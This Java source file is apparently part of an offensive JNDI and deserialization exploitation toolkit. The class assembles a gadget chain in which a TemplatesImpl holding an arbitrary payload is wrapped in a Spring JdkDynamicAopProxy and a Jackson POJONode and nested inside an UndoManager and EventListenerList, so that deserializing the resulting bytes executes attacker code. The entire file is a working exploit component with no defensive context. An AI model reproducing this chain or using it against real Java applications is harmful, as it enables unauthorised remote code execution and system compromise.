package sonomon.jndi.deser.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Vector;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import org.springframework.aop.framework.AdvisedSupport;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Jackson_EventListenerList_JdkDynamicAopProxy_Templates implements SerializeObject{
	//jackson3_100
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(tempImpl);
        Constructor constructoraop = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructoraop.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructoraop.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
	
        POJONode node = new POJONode(proxy);
        
        
        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Vector vector = (Vector) Deserialize.getFieldValue(undoManager, "edits").get(undoManager);
        vector.add(node);
        Deserialize.setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, undoManager});
        
        
        return eventListenerList;
    }
}